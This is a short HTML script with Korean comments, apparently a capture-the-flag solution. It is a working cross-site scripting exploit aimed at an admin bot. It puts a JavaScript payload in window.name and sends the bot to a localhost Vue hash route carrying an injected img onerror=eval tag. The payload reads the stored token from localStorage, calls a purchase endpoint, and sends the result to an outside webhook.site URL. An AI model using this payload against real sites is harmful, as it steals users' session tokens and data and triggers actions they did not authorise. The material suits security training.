<script>
    // 1. 봇이 localhost 안에서 실행할 실제 공격 코드
    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
    const payload = `
        fetch('/4/buy', {
            method: 'POST',
            headers: { 'token': localStorage.getItem('token') }
        })
        .then(r => r.json())
        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)))
        .catch(e => fetch('${webhook}?error=' + encodeURIComponent(e)));
    `;

    // 2. window.name에 페이로드 저장 (도메인이 바뀌어도 유지됨)
    window.name = payload;

    // 3. 다시 localhost로 보내되, /debug 대신 SPA 라우트를 이용합니다.
    // Vue 앱의 해시(#) 뒤에 스크립트를 삽입하여 실행을 유도합니다.
    location.href = "http://localhost:3000/#/<img src=x onerror=eval(window.name)>";
</script>
